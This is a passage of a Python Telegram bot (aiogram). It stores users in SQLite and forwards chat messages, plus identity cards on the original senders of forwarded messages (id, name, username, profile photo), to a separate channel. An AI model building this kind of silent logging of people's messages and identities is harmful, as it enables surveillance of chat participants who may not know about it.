            sql.execute(query, (user_id,))
            count = sql.fetchone()[0]
            if count > 0:
                #print("Пользователь существует.")
                sql.execute("UPDATE users SET usersname = ?, username = ? WHERE id = ?", (usersname, username, user_id))
                db.commit()
                db.close()
                sql.close()
            else:
                #print("Пользователь не найден.")
                sql.execute("INSERT INTO users (id, usersname, username) VALUES (?, ?, ?)", (user_id, usersname, username))
                db.commit()
                db.close()
                sql.close()

        except Exception as e:
            print(f'Error saving user data: {e}')

        if message.forward_from.username is None:
            use = "don't use"
        else:
            use = f"@{message.forward_from.username}"

        try:
            now = datetime.datetime.now(datetime.UTC)
            data = now.strftime("%Y-%m-%d %H:%M:%S")
            photo = await bot.get_user_profile_photos(message.forward_from.id)
            await bot.send_photo(chat_id=idchnik, photo=photo.photos[0][2].file_id, caption=f'''👤
├chat id: not available
├message id: not availalble
├user id: <code>{message.forward_from.id}</code>
├user"$ name: {message.forward_from.first_name}
├username: {use}
└link: <a href="tg://user?id={message.forward_from.id}">{message.forward_from.full_name}</a>

⏱️
Информация от {data}''', parse_mode='html')
            #print(message)
            print()
        except Exception as e:
            now = datetime.datetime.now(datetime.UTC)
            data = now.strftime("%Y-%m-%d %H:%M:%S")
            print(f'Error sending user photo: {e}')
            await bot.send_message(chat_id=idchnik, text=f'''👤
├chat id: not available
├message id: not available
├user id: <code>{message.forward_from.id}</code>
├user"$ name: {message.forward_from.first_name}
├username: {use}
└link: <a href="tg://user?id={message.forward_from.id}">{message.forward_from.full_name}</a>

⏱️
Информация от {data}''', parse_mode='html')
            #print(message)
            print()

    else:
        msg = message
        #print(msg)
        f = str(message)
        global idr
        idr = message.message_id
        g = str(message.message_id)
        print(f'{message.from_user.full_name}: {message.text}')
        #await bot.send_chat_action(chat_id=idchnik, action='typing')
        await bot.send_message(idchnik, f'''<code>{message.chat.id}</code> {message.chat.title}: <code>{idr}</code>:
<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>: {message.text}''', parse_mode='html')

    try:
        db = sqlite3.connect('verest.db', check_same_thread=False)
        sql = db.cursor()
        user_id = message.from_user.id
        usersname = message.from_user.full_name
        #print('база данных подключена')
        if message.from_user.username is None:
            username = "dont use"
            #print('dnt')
        else:
            username = message.from_user.username
            #print(username)

        query = "SELECT COUNT(*) FROM users WHERE id = ?"
        sql.execute(query, (user_id,))
        count = sql.fetchone()[0]
        if count > 0:
            #print("Пользователь существует.")
            sql.execute("UPDATE users SET usersname = ?, username = ? WHERE id = ?", (usersname, username, user_id))
            db.commit()
            db.close()
        else:
            #print("Пользователь не найден.")
            sql.execute("INSERT INTO users (id, usersname, username) VALUES (?, ?, ?)", (user_id, usersname, username))
            db.commit()
            db.close()


    except Exception as e:
        print(f'Error saving user data: {e}')

async def main() -> None:
    #session = AiohttpSession(proxy='http://proxy.server:3128')
    # Initialize Bot instance with default bot properties which will be passed to all API calls
    bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))

    # And the run events dispatching
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, stream=sys.stdout)
    asyncio.run(main())
